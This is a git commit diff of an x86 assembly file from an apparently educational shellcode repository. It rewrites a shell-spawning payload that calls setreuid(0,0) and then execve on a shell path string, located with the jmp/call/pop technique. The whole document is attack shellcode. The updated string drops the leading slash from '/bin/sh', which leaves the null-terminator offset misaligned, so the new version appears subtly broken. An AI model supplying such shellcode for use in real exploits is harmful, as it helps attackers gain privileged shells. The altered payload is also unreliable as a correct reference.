6e3845777b785d4f57bcf27c0a4a0b9807106706
reruo321 <48712088+reruo321@users.noreply.github.com>
2023-10-20 16:01:21 +0900

    Update spawn2.s

--- 00003-Writing-Shellcode/x86/00002-Shell-Spawning-Code/Version-002/src/spawn2.s
+++ 00003-Writing-Shellcode/x86/00002-Shell-Spawning-Code/Version-002/src/spawn2.s
@@ -1,22 +1,26 @@
-call hello
+.data
+.text
+.global _start
+
+_start:
+        movl $70, %eax
+        movl $0, %ebx
+        movl $0, %ecx
+        int $0x80
+
+        jmp hello
 bye:
-popl %ebx
+        popl %ebx
 
-movl $70, %eax
-movl $0, %ebx
-movl $0, %ecx
-int $0x80
+        movl $0, %eax
+        movb %al, 7(%ebx)
+        movl %ebx, 8(%ebx)
+        movl %eax, 12(%ebx)
 
-movl $0, %eax
-movb %al, 7(%ebx)
-movl %ebx, 8(%ebx)
-movl %eax, 12(%ebx)
-
-movl $11, %eax
-leal 8(%ebx), %ecx
-leal 12(%ebx), %edx
-int $0x80
-
+        movl $11, %eax
+        leal 8(%ebx), %ecx
+        leal 12(%ebx), %edx
+        int $0x80
 hello:
-call bye
-.string "/bin/shXAAAABBBB"
+        call bye
+        .string "bin/shXAAAABBBB"
